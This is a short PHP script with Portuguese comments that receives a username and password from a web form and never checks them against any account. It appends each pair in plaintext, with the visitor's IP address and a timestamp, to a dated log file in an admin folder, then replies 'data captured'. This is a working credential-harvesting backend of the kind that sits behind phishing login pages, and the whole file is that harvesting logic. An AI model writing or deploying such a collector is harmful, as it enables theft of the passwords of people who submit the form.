<?php
// Receber dados do formulário
$usuario = isset($_POST['usuario']) ? trim($_POST['usuario']) : '';
$senha = isset($_POST['senha']) ? trim($_POST['senha']) : '';
$timestamp = date('Y-m-d H:i:s');

// Validar dados
if (empty($usuario) || empty($senha)) {
    http_response_code(400);
    echo json_encode(['status' => 'erro', 'mensagem' => 'Usuário e senha são obrigatórios']);
    exit;
}

// Diretório para armazenar logs
$dir_logs = __DIR__ . '/admin/logins';
if (!is_dir($dir_logs)) {
    mkdir($dir_logs, 0755, true);
}

// Arquivo de log
$arquivo_log = $dir_logs . '/logins_' . date('Y-m-d') . '.txt';

// Dados a salvar
$dados = "[$timestamp] Usuário: $usuario | Senha: $senha | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";

// Salvar em arquivo
file_put_contents($arquivo_log, $dados, FILE_APPEND | LOCK_EX);

// Retornar sucesso
http_response_code(200);
echo json_encode(['status' => 'sucesso', 'mensagem' => 'Dados capturados']);
?>
